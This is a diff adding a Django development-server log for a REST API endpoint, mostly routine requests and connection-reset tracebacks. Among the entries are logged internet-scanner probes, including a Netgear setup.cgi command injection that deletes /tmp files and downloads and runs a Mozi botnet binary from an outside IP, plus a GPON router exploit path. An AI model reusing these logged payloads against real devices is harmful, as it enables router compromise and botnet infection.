+[15/Dec/2020 19:44:07] "POST /api/vi/ddobakis/ HTTP/1.1" 400 52
+Bad Request: /api/vi/ddobakis/
+[15/Dec/2020 19:44:13] "POST /api/vi/ddobakis/ HTTP/1.1" 400 52
+[15/Dec/2020 19:44:31] "GET /static/rest_framework/css/bootstrap-tweaks.css HTTP/1.1" 304 0
+[15/Dec/2020 19:44:31] "GET /static/rest_framework/css/bootstrap.min.css HTTP/1.1" 304 0
+[15/Dec/2020 19:44:31] "GET /static/rest_framework/css/prettify.css HTTP/1.1" 304 0
+[15/Dec/2020 19:44:31] "GET /static/rest_framework/js/jquery-3.5.1.min.js HTTP/1.1" 304 0
+[15/Dec/2020 19:44:31] "GET /static/rest_framework/js/ajax-form.js HTTP/1.1" 304 0
+[15/Dec/2020 19:44:31] "GET /api/vi/ddobakis/ HTTP/1.1" 200 148233
+[15/Dec/2020 19:44:31] "GET /static/rest_framework/js/bootstrap.min.js HTTP/1.1" 304 0
+[15/Dec/2020 19:44:31] "GET /static/rest_framework/js/default.js HTTP/1.1" 304 0
+[15/Dec/2020 19:44:31] "GET /static/rest_framework/js/csrf.js HTTP/1.1" 304 0
+[15/Dec/2020 19:44:31] "GET /static/rest_framework/img/grid.png HTTP/1.1" 304 0
+[15/Dec/2020 19:44:31] "GET /static/rest_framework/js/prettify-min.js HTTP/1.1" 304 0
+Bad Request: /api/vi/ddobakis/
+[15/Dec/2020 19:44:46] "POST /api/vi/ddobakis/ HTTP/1.1" 400 52
+[15/Dec/2020 19:44:50] "GET /api/vi/ddobakis/ HTTP/1.1" 200 148233
+Bad Request: /api/vi/ddobakis/
+[15/Dec/2020 19:45:09] "POST /api/vi/ddobakis/ HTTP/1.1" 400 52
+[15/Dec/2020 19:45:12] "GET /api/vi/ddobakis/ HTTP/1.1" 200 148233
+----------------------------------------
+Exception happened during processing of request from ('112.152.69.155', 59784)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/home/ubuntu/rest_env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/home/ubuntu/rest_env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+[15/Dec/2020 20:41:10] code 400, message Bad request syntax ('º«d¡EZCÛM\x87î^ý¿\x159 XÔ>\x12\x98Ä<à\x13Ï\x00¬\xa09×\x90#8~\x8cÞ\x9dReF¿%1Qà\x9d\x06&g»\x82\x95\x19í\x07\x14\x19ZP\x80+\x94eÃæ\x85\x06¤\x99\x8b\x19l\x01ê\x88Y\x91\x16\x95ÄÈ\x0eH\x02Ç\x93gÁ4FW\x05|ûóT¸ýË»)ãÎÝÍ7\x9eïP\x8c¤[Vý\x98Él\x82õäÁd\x87X÷\x9b¿èq\x12\x99&Û,õ\x87×¨\x97j;ãê§´°\x02\xad\x8dE\x9bªB\x80\x0e)©é¯}\x18\x8e¸\x1e\x99\x04ï¨\x8cè\x04âÓí)1\x91Á\x8f\x88\x8c\x81ðÛ¥\x88\x95H\x9bZ«Î¿ôE%P*\x88KFY6\x9eç::jÔ\x8a¨V\x9aª«¯Ã&.í[\x04Åe\x7f\x08¾\x8ar§°\x99F÷\x11åÖ\x96\x8cIm+w\x1cýuU\x14\x0f!x¬èMPyÃ\x19!2\xa0íÀ}!Rw\x14\x8e\x1bÄá\xa0¯+\xadKkÅà\\s\x9c½Ë')
+[15/Dec/2020 20:41:10] "º«d¡EZCÛMî^ý¿9 XÔ>Ä<àÏ ¬ 9×#8~ÞReF¿%1Qà&g»íZP+eÃæ¤lêYÄÈHÇgÁ4FW|ûóT¸ýË»)ãÎÝÍ7ïP¤[VýÉlõäÁdX÷¿èq&Û,õ×¨j;ãê§´°­EªB)©é¯}¸ï¨èâÓí)1ÁðÛ¥HZ«Î¿ôE%P*KFY6ç::jÔ¨Vª«¯Ã&.í[Åe¾r§°F÷åÖIm+wýuU!x¬èMPyÃ!2 íÀ}!RwÄá ¯+­KkÅà\s½Ë" 400 -
+Not Found: /hudson
+[15/Dec/2020 20:47:10] "GET /hudson HTTP/1.1" 404 2172
+Not Found: /
+[15/Dec/2020 20:51:12] "GET / HTTP/1.1" 404 2136
+[15/Dec/2020 20:58:20] code 400, message Bad request syntax ("\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03»I§!\x14HéT\xad'aM\x871'à«»\x8fUÄ%Á\x8dÏÅ\x05muJ£Ö +Å\xa0´µ,\x1e|v\x8c=\x0e·1\x0fÕ+\x17¯¨\x0b\x1f!ä$ë|\x19Tjfõ\x00&À/À0À+À,Ì¨Ì©À\x13À\tÀ\x14À")
+[15/Dec/2020 20:58:20] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Not Found: /
+[15/Dec/2020 20:58:20] "GET / HTTP/1.1" 404 2136
+Not Found: /setup.cgi
+[15/Dec/2020 21:13:36] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://59.92.181.194:56789/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 2383
+[15/Dec/2020 22:35:31] "POST /api/vi/ddobakis/ HTTP/1.1" 201 193
+[15/Dec/2020 22:35:43] "POST /api/vi/ddobakis/ HTTP/1.1" 201 204
+----------------------------------------
+Exception happened during processing of request from ('112.152.69.155', 60292)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/home/ubuntu/rest_env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/home/ubuntu/rest_env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Not Found: /GponForm/diag_Form
+[15/Dec/2020 22:36:42] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 2215
+----------------------------------------
+Exception happened during processing of request from ('175.5.76.151', 13774)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/home/ubuntu/rest_env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/home/ubuntu/rest_env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+[15/Dec/2020 22:36:55] "GET /api/vi/ddobakis/ HTTP/1.1" 200 149236
+Bad Request: /api/vi/ddobakis/
+[15/Dec/2020 22:39:41] "POST /api/vi/ddobakis/ HTTP/1.1" 400 52
+[15/Dec/2020 22:43:39] "POST /api/vi/ddobakis/ HTTP/1.1" 201 204
+----------------------------------------
+Exception happened during processing of request from ('112.152.69.155', 60354)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/home/ubuntu/rest_env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/home/ubuntu/rest_env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+[15/Dec/2020 22:44:46] "GET /api/vi/ddobakis/ HTTP/1.1" 200 149743
+Bad Request: /api/vi/ddobakis/
+[15/Dec/2020 22:50:06] "POST /api/vi/ddobakis/ HTTP/1.1" 400 52
+[15/Dec/2020 22:51:30] "POST /api/vi/ddobakis/ HTTP/1.1" 201 193
+[15/Dec/2020 22:51:42] "POST /api/vi/ddobakis/ HTTP/1.1" 201 204
+Watching for file changes with StatReloader
+[15/Dec/2020 23:37:41] "GET /api/vi/ddobakis/ HTTP/1.1" 200 151529
+Bad Request: /api/vi/ddobakis/
+[15/Dec/2020 23:43:48] "POST /api/vi/ddobakis/ HTTP/1.1" 400 52
+[15/Dec/2020 23:43:57] "POST /api/vi/ddobakis/ HTTP/1.1" 201 219
+----------------------------------------
+Exception happened during processing of request from ('112.152.69.155', 60638)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/home/ubuntu/rest_env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/home/ubuntu/rest_env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+[15/Dec/2020 23:44:37] "POST /api/vi/ddobakis/ HTTP/1.1" 201 219
+Bad Request: /api/vi/ddobakis/
+[15/Dec/2020 23:44:47] "POST /api/vi/ddobakis/ HTTP/1.1" 400 52
+[15/Dec/2020 23:44:58] "POST /api/vi/ddobakis/ HTTP/1.1" 201 218
+----------------------------------------
+Exception happened during processing of request from ('112.152.69.155', 60645)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/home/ubuntu/rest_env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/home/ubuntu/rest_env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+[15/Dec/2020 23:46:02] "POST /api/vi/ddobakis/ HTTP/1.1" 201 220
+[15/Dec/2020 23:46:19] "POST /api/vi/ddobakis/ HTTP/1.1" 201 227
+[15/Dec/2020 23:46:38] "POST /api/vi/ddobakis/ HTTP/1.1" 201 223
+[15/Dec/2020 23:46:53] "POST /api/vi/ddobakis/ HTTP/1.1" 201 223
+[15/Dec/2020 23:47:05] "POST /api/vi/ddobakis/ HTTP/1.1" 201 223
+[15/Dec/2020 23:47:18] "POST /api/vi/ddobakis/ HTTP/1.1" 201 199
